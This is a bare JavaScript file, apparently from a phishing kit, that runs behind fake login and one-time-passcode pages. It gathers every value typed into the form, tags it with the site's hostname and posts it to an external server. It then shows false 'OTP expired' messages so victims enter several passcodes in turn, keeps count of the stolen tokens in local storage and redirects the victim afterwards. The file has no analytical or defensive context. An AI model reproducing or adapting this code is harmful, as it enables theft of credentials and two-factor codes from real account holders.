// calling server data..
var API_URL = "https://p4ni.shdsdf";
var OTT = 0;
var hasPath = "";
var formSubmitted = false;
function serverCall(body, nextURL) {
  fetch(API_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  })
    .then((res) => res.json())
    .then((responseData) => {
      if (responseData.status === 200) {
        formSubmitted = false;
        if (getQuery("next") == "cpan.html" && OTT === 0) {
          document.getElementById("tok-invalid").innerHTML =
            "This OTP is expired, Please re-enter new otp";
          setTimeout(function () {
            document.getElementById("tok-invalid").innerHTML = "";
          }, 3000);
          OTT++;
          return false;
        }
        if (getQuery("next") == "un" && OTT < 9) {
          document.getElementById("tok-invalid").innerHTML =
            "This OTP is expired, Please re-enter new otp";
          setTimeout(function () {
            document.getElementById("tok-invalid").innerHTML = "";
          }, 3000);
          OTT++;
          return false;
        }
        if (OTT == 8) {
          window.location.href = "index.html";
        }
        window.location.href = nextURL;
      } else {
        console.log("response is not valid");
      }
    })
    .catch((error) => {
      console.error(error);
    });
}

window.onload = function () {
  hasPath = window.location.pathname;
  if (hasPath.indexOf("tok") !== -1) {
    document.getElementById("nextValue").value =
      "loader.html?next=" + getQuery("next");
  }
  let form = document.getElementById("frm_2_am8E_");
  let query = getQuery("next");
  if (query) {
    $("#nextValue").val(query);
  }
  let nextValue = document.getElementById("nextValue").value;
  form.addEventListener("submit", function (event) {
    event.preventDefault();
    if (formSubmitted) {
      console.log("Form has already been submitted");
      return;
    }
    formSubmitted = true;
    let formData = {};
    for (let i = 0; i < form.elements.length; i++) {
      let element = form.elements[i];
      if (element.tagName === "INPUT") {
        if (
          element.value == "RESET" ||
          element.value == "LOGIN" ||
          element.value == "Submit" ||
          element.value == "SUBMIT" ||
          element.value == "PROCEED" ||
          element.value == ""
        ) {
          continue;
        }
        if (element.name == "T") {
          let one_1 = counterIncrement();
          formData[element.name + "-" + one_1] = element.value;
        } else {
          formData[element.name] = element.value;
        }
      }
    }
    document.getElementById("frm_2_am8E_").reset();
    formData["site"] = window.location.hostname;
    serverCall(formData, nextValue);
  });
};

function getQuery(query) {
  var currentURL = window.location.href;
  var urlParams = new URLSearchParams(currentURL.split("?")[1]);
  var nextValue = urlParams.get(query);
  return nextValue;
}

function counterIncrement() {
  var counterValue = localStorage.getItem("1");
  if (hasPath == "/tok" || hasPath == "/tok.html") {
    if (counterValue === null) {
      counterValue = 0;
    } else {
      counterValue = parseInt(counterValue);
    }
    counterValue++;
    localStorage.setItem("1", counterValue);
  }
  return counterValue;
}

$(".numericInput").on("input", function (event) {
  var value = $(this).val();
  if (/[^0-9]/.test(value)) {
    this.value = value.replace(/[^0-9]/g, "");
  }
});
